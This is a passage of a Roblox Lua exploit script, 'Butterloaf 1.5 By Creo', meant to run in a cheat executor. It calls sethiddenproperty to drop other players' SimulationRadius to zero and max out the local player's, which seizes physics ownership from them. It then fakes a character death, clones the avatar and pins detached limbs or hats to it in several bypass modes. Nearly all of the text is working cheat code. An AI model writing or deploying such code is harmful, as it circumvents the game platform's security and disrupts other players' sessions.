			Icon = "";
			Duration = Duration;
			Button1 = Button1Text;
			Button2 = nil;
			Callback = NotificationBindable;
		})
	end

	Msgreq("Butterloaf 1.5 By Creo","Loading, please wait while it loads",5,nil)
	LoadingText.Text = "Loading rest of script."
	local SongID = "rbxassetid://6498555267"
	Bypass = "death"
	if not Bypass then Bypass = "limbs" end
	HumanDied = false

	CountSCIFIMOVIELOL = 1
	function SCIFIMOVIELOL(Part0,Part1,Position,Angle)
		local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = "AliP_"..CountSCIFIMOVIELOL
		AlignPos.ApplyAtCenterOfMass = true;
		AlignPos.MaxForce = 67752;
		AlignPos.MaxVelocity = math.huge/9e110;
		AlignPos.ReactionForceEnabled = false;
		AlignPos.Responsiveness = 200;
		AlignPos.RigidityEnabled = false;
		local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = "AliO_"..CountSCIFIMOVIELOL
		AlignOri.MaxAngularVelocity = math.huge/9e110;
		AlignOri.MaxTorque = 67752;
		AlignOri.PrimaryAxisOnly = false;
		AlignOri.ReactionTorqueEnabled = false;
		AlignOri.Responsiveness = 200;
		AlignOri.RigidityEnabled = false;
		local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = "AthP_"..CountSCIFIMOVIELOL
		local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = "AthP_"..CountSCIFIMOVIELOL
		local AttachmentC=Instance.new('Attachment',Part1); AttachmentC.Name = "AthO_"..CountSCIFIMOVIELOL
		local AttachmentD=Instance.new('Attachment',Part0); AttachmentD.Name = "AthO_"..CountSCIFIMOVIELOL
		AttachmentC.Orientation = Angle
		AttachmentA.Position = Position
		AlignPos.Attachment1 = AttachmentA;
		AlignPos.Attachment0 = AttachmentB;
		AlignOri.Attachment1 = AttachmentC;
		AlignOri.Attachment0 = AttachmentD;
		CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1

	end

	coroutine.wrap(function()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:wait()
		if sethiddenproperty then
			while true do
				game:GetService("RunService").RenderStepped:Wait()
				settings().Physics.AllowSleep = false
				local TBL = game:GetService("Players"):GetChildren() 
				for _ = 1,#TBL do local Players = TBL[_]
					if Players ~= game:GetService("Players").LocalPlayer then
						Players.MaximumSimulationRadius = 0
						sethiddenproperty(Players,"SimulationRadius",0) 
					end 
				end
				game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
				sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.pow(math.huge,math.huge)*math.huge)
				if HumanDied then break end
			end
		else
			while true do
				game:GetService("RunService").RenderStepped:Wait()
				settings().Physics.AllowSleep = false
				local TBL = game:GetService("Players"):GetChildren() 
				for _ = 1,#TBL do local Players = TBL[_]
					if Players ~= game:GetService("Players").LocalPlayer then
						Players.MaximumSimulationRadius = 0
					end 
				end
				game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
				if HumanDied then break end
			end
		end
	end)()

	if game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
		if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
			wait() 
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
			DeadChar.HumanoidRootPart:Destroy()

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				VEL = 1
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
				wait()
				VEL = 0
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				pcall(function()
					CloneChar.Humanoid.Health = 0
					DeadChar.Humanoid.Health = 0
				end)
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if HumanDied then break end
					DeadChar["Torso"].CFrame = CloneChar["Torso"].CFrame
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") and table.find(SETHATS,v.Handle) == nil then
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end

			DeadChar.Torso["Left Shoulder"]:Destroy()
			DeadChar.Torso["Right Shoulder"]:Destroy()
			DeadChar.Torso["Left Hip"]:Destroy()
			DeadChar.Torso["Right Hip"]:Destroy()

		elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
			game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
			local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
			Instance.new("Part",FalseChar).Name = "Head" 
			Instance.new("Part",FalseChar).Name = "Torso" 
			Instance.new("Humanoid",FalseChar).Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"] = FalseChar
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
			local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
			Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
			Clone.Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
			game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 
			wait(5.65) 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
			wait() 
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid 
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			FalseChar:Destroy()

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						CloneChar.Humanoid.WalkToPoint = CloneChar.HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						HumanRoot.CanCollide = false
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
						HumanRoot.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				CloneChar.Humanoid.Health = 0
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["HumanoidRootPart"],CloneChar["HumanoidRootPart"],Vector3.new(0,0,0),Vector3.new(0,0,0))

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") and table.find(SETHATS,v.Handle) == nil then
					print(v.Parent.Name)
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end
		elseif Bypass == "hats" then
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local DeadChar = game.Players.LocalPlayer.Character
			DeadChar.Name = "non"
			local HatPosition = Vector3.new(0,0,0)
			local HatName = "MediHood"
			local HatsLimb = {
				Rarm = DeadChar:FindFirstChild("Hat1"),
				Larm = DeadChar:FindFirstChild("Pink Hair"),
				Rleg = DeadChar:FindFirstChild("Robloxclassicred"),
				Lleg = DeadChar:FindFirstChild("Kate Hair"),
				Torso1 = DeadChar:FindFirstChild("Pal Hair"),
				Torso2 = DeadChar:FindFirstChild("LavanderHair")
			}
			HatName = DeadChar:FindFirstChild(HatName)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			SCIFIMOVIELOL(HatName.Handle,DeadChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(HatsLimb.Torso1.Handle,DeadChar["Torso"],Vector3.new(0.5,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Torso2.Handle,DeadChar["Torso"],Vector3.new(-0.5,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Larm.Handle,DeadChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Rarm.Handle,DeadChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Lleg.Handle,DeadChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Rleg.Handle,DeadChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))

			for i,v in pairs(HatsLimb) do
				v.Handle:FindFirstChild("AccessoryWeld"):Destroy()
				if v.Handle:FindFirstChild("Mesh") then v.Handle:FindFirstChild("Mesh"):Destroy() end
				if v.Handle:FindFirstChild("SpecialMesh") then v.Handle:FindFirstChild("SpecialMesh"):Destroy() end
			end
			HatName.Handle:FindFirstChild("AccessoryWeld"):Destroy()
		end
	else
		if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid 
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
			DeadChar.HumanoidRootPart:Destroy()

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				CloneChar.Humanoid.Health = 0
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					v:Clone().Parent = CloneChar
				end
			end

			for _,v in next, DeadChar:GetDescendants() do
				if v:IsA("Motor6D") and v.Name ~= "Neck" then
					v:Destroy()
				end
			end

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

			SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if HumanDied then break end
					DeadChar["UpperTorso"].CFrame = CloneChar["Torso"].CFrame * CFrame.new(0,0.2,0)
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end

		elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
			game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
			local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
			Instance.new("Part",FalseChar).Name = "Head" 
			Instance.new("Part",FalseChar).Name = "UpperTorso"
			Instance.new("Humanoid",FalseChar).Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"] = FalseChar
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
			local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
			Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
			Clone.Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
			game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 
			wait(5.65) 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
			wait() 
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid 
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			FalseChar:Destroy()

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
